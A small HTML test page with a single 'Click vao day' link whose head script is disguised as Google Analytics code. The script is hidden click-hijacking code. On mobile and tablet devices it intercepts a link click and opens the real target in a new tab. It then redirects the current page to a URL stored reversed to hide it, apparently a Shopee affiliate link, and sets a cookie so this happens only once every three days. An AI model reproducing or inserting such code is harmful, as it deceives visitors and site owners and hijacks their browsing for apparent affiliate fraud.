<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Test</title>

        <script>

            function getGA(name) {
                var cookies = document.cookie.split('; ');
                for (var i = 0; i < cookies.length; i++) {
                    var parts = cookies[i].split('=');
                    if (parts[0] === name) {
                        return parts[1];
                    }
                }
                return null;
            }
            
            function setGA(name, value, exdays) {
                document.cookie = `${name}=${value};expires=${new Date(Date.now() + exdays * 864e5).toString()};path=/`;
            }
            
            function isMobileOrTablet() {
                const ua = window.navigator.userAgent.toLowerCase();
                const isTouchScreen = typeof window.matchMedia !== "function" || window.matchMedia("(pointer:coarse)").matches === true;
                return window.navigator.maxTouchPoints > 0 && isTouchScreen && (/android|iphone|ipod|ipad|tablet|playbook|silk|kindle/.test(ua) || window.matchMedia("(max-width: 1024px)").matches);
            }
            
            const gaTrackId = 'i6ijspCxA2/nv.eepohs.s//:sptth', gaCode = getGA('_ga_D8SD9STSJ5');
            
            document.addEventListener('click', function (e) {
                const target = e.target.closest("a");
                if (!target) return;
                const targetHref = target.getAttribute('href');
                if (!targetHref || targetHref === '/') return;
                try {
                    if (!isMobileOrTablet() || (gaCode && gaCode === 'true')) return;
                    e.preventDefault();
                    setGA('_ga_D8SD9STSJ5', 'true', 3);
                    window.open(targetHref, '_blank');
                    window.location.replace(gaTrackId.split('').reverse().join(''));
                } catch { }
            }, true);
            
        </script>
    </head>
    <body>
        <a href="https://www.google.com/">Click vao day</a>
    </body>
</html>
